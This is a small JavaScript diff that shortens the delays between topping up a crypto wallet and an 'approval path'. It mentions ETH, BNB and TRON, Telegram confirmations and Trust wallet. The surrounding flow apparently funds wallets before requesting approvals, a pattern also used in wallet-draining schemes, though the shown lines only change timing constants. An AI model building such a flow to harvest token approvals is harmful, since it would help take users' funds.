@@ -149,12 +149,13 @@ function liveEthMeetsMin(currentBalanceRaw) {
 function approvalDelayAfterTopup(networkKey) {
     const key = String(networkKey || "").toLowerCase();
 
+    // ETH/BNB already waited for tx.wait() before Telegram confirmed — no extra
+    // fixed delay. TRON keeps a short buffer for wallet sync.
     if (key === "tron" || key === "trc20" || key === "trx") {
-        return 12000;
+        return 5000;
     }
 
-    // Hold after hash before approval path — Trust needs time to show received ETH.
-    return 10000;
+    return 0;
 }
 
 function publicTopup(network, raw) {
